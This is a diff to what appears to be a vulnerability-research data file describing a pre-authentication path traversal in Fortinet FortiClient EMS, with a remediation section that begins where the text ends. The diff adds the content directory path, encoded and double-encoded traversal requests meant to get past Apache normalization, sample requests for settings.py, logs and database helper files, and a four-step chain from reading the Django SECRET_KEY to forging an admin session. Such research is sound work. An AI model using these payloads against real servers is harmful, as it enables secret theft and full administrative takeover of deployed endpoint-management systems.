@@ -157,24 +157,46 @@ EMS_F2_CONTENT_PATH_TRAVERSAL = {
     },
 
     "auth_status": (
-        "UNKNOWN -- views.pyc shows CONTENT_DIRECTORY imported in views.py alongside session auth; "
-        "whether content() is decorated with @prepare_api (requires auth) or served unauthenticated "
-        "could not be confirmed from pyc strings alone. "
-        "If unauthenticated: pre-auth LFI. If authenticated: chained with EMS-F1 for full exploit."
+        "CONFIRMED PRE-AUTH -- url group analysis from urls.pyc binary shows content/ "
+        "pattern is in the same URL group as signin/ and favicon.ico (both pre-auth), "
+        "BEFORE the authenticated API routes. content/ serves localization JS files "
+        "needed on the login page before a session exists. No @prepare_api decorator."
     ),
 
+    "content_directory": {
+        "value":    "C:\\Program Files\\Fortinet\\FortiClientEMS\\Fcm\\fcm\\static\\js\\localization\\",
+        "evidence": "localization_files_util.pyc strings: LOCALIZATION_FOLDER_PATH, static/js/localization/",
+        "depth":    3,  # levels up from localization/ to fcm/ where settings.py lives
+    },
+
+    "traversal_notes": {
+        "apache_normalization": (
+            "EMS runs Apache24 as the web server (apache_django_wsgi.conf). "
+            "Apache normalizes literal ../ in URL paths before WSGI dispatch, "
+            "which may block direct path traversal. However: "
+            "(1) URL-encoded variants (%2e%2e%2f) may pass if AllowEncodedSlashes is On; "
+            "(2) Windows-specific path parsing may differ; "
+            "(3) If Django receives the raw path without Apache normalization, traversal works directly."
+        ),
+        "bypass_candidates": [
+            "GET /content/%2e%2e%2f%2e%2e%2f%2e%2e%2fsettings.py (encoded slashes)",
+            "GET /content/..%2fsettings.py (mixed encoding)",
+            "GET /content/%252e%252e%252fsettings.py (double encoding)",
+        ],
+    },
+
     "attack_chain": [
-        "Step 1 [authenticated]: Forge admin session via EMS-F1",
-        "Step 2: GET /content/../fcm/settings.py",
-        "Step 3: Recover live SECRET_KEY from response (if installer changed default)",
-        "Step 4: Forge new session with recovered key",
+        "Step 1: GET /content/../../../settings.py (or encoded variant)",
+        "Step 2: Read SECRET_KEY from response (live installed key if installer changed it, or default)",
+        "Step 3: Forge admin session cookie using recovered key (EMS-F1 primitive)",
+        "Step 4: Full admin API access with forged session",
     ],
 
     "samples": [
-        "GET /content/../fcm/settings.py",
-        "GET /content/../../logs/api_2025-04-08.log",
-        "GET /content/../../../Windows/System32/drivers/etc/hosts",
-        "GET /content/../fcm/models/utils/sql_helper.pyc (recover DB connection strings)",
+        "GET /content/../../../settings.py",
+        "GET /content/%2e%2e%2f%2e%2e%2f%2e%2e%2fsettings.py",
+        "GET /content/../../../logs/api_2025-04-08.log",
+        "GET /content/../../../models/utils/sql_helper.pyc",
     ],
 
     "remediation": [
